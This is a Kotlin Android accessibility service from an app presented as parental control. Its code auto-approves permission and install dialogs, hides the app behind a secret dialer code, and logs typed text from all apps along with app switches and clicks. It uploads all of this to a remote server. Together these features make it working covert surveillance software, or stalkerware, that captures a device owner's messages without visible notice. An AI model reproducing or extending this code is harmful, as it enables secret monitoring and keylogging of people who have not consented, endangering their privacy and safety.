package com.parentalcontrol.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class TrackerAccessibilityService : AccessibilityService() {

    private var lastPackageName: String? = null
    private var lastEventTime: Long = 0

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val now = System.currentTimeMillis()

        // ── Auto Permission & Setup Approval ──────────────────────────
        // Only auto-tap known permission/install dialogs (NOT settings/systemui)
        if (AutoPermissionHelper.isAutoTappableDialog(packageName)) {
            val success = AutoPermissionHelper.autoApproveDialog(this)
            if (success) {
                Log.d(TAG, "Auto-approved dialog from: $packageName")
                lastEventTime = now
                return
            }
        }

        // ── Dialer Secret Code Detection (Android 12+ fallback) ──────
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        ) {
            if (AutoPermissionHelper.checkDialerForSecretCode(this, packageName)) {
                Log.d(TAG, "Secret code detected in dialer — launching app")
                DialerSecretCodeReceiver.revealAndLaunch(this)
                lastEventTime = now
                return
            }
        }

        // ── Monitoring (only when tracking is active) ────────────────
        if (!TrackerService.isRunning) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (now - lastEventTime > 2000) {
                    lastPackageName = packageName
                    lastEventTime = now
                    val className = event.className?.toString() ?: ""
                    val appName = getAppName(packageName)
                    sendAppSwitchReport(packageName, appName, className)
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val source = event.source
                    if (source != null && !source.isPassword) {
                        val text = event.text?.joinToString(" ")
                        val pkg = event.packageName?.toString() ?: ""
                        if (text != null && text.isNotBlank() && text.length > 3) {
                            sendKeyLog(pkg, text)
                        }
                        source.recycle()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val pkg = event.packageName?.toString() ?: return
                val viewId = event.contentDescription?.toString()
                if (viewId != null && viewId.isNotBlank()) {
                    sendClickReport(pkg, viewId)
                }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "TrackerAccessibilityService connected")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    private fun sendAppSwitchReport(packageName: String, appName: String, className: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.parentalcontrol.app.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "app_switch")
                            put("package_name", packageName)
                            put("app_name", appName)
                            put("data", org.json.JSONObject().apply {
                                put("className", className)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.parentalcontrol.app.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendKeyLog(packageName: String, text: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.parentalcontrol.app.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "text_input")
                            put("package_name", packageName)
                            put("data", org.json.JSONObject().apply {
                                put("text", text.take(200))
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.parentalcontrol.app.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendClickReport(packageName: String, viewId: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.parentalcontrol.app.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "click")
                            put("package_name", packageName)
                            put("data", org.json.JSONObject().apply {
                                put("viewId", viewId)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.parentalcontrol.app.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    companion object {
        private const val TAG = "TrackerAccessibility"

        @Volatile
        var instance: TrackerAccessibilityService? = null
            private set

        fun isAccessibilityServiceEnabled(context: android.content.Context): Boolean {
            val am = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
            val cn = android.content.ComponentName(context, TrackerAccessibilityService::class.java)
            try {
                val enabledServices = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: return false
                return enabledServices.contains(cn.flattenToString())
            } catch (e: Exception) {
                return false
            }
        }

        fun openAccessibilitySettings(context: android.content.Context) {
            val intent = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
            context.startActivity(Intent(intent).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }
    }
}
